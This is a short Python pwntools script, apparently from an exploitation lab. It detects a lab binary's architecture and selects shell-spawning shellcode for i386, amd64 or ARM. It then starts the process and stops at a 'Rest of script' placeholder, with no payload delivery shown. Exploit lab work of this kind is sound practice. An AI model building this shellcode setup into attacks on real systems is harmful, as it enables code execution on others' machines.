from pwn import *

# Define a dictionary mapping architecture to shellcode
shellcodes = {
    'i386': shellcraft.i386.linux.sh(),
    'x86-64': shellcraft.amd64.linux.sh(),
    'arm': shellcraft.arm.linux.sh(),
    # Add more architectures and shellcodes as needed
}

# Specify the path to the binary
binary_path = './5-3_lab.bin'

# Get architecture information from the binary
result = subprocess.run(['file', binary_path], stdout=subprocess.PIPE)
output = result.stdout.decode('utf-8')

# Extract the architecture information from the output
architecture = None
if 'i386' in output:
    architecture = 'i386'
elif 'x86-64' in output:
    architecture = 'x86-64'
elif 'ARM' in output:
    architecture = 'arm'
# Add more architecture checks as needed

if architecture is None:
    print("Unsupported architecture")
    exit(1)

# Set the appropriate shellcode based on the detected architecture
SHELLCODE = asm(shellcodes[architecture])

# Use the selected SHELLCODE and binary path
context.binary = binary_path
p = process(binary_path)

# Rest of script
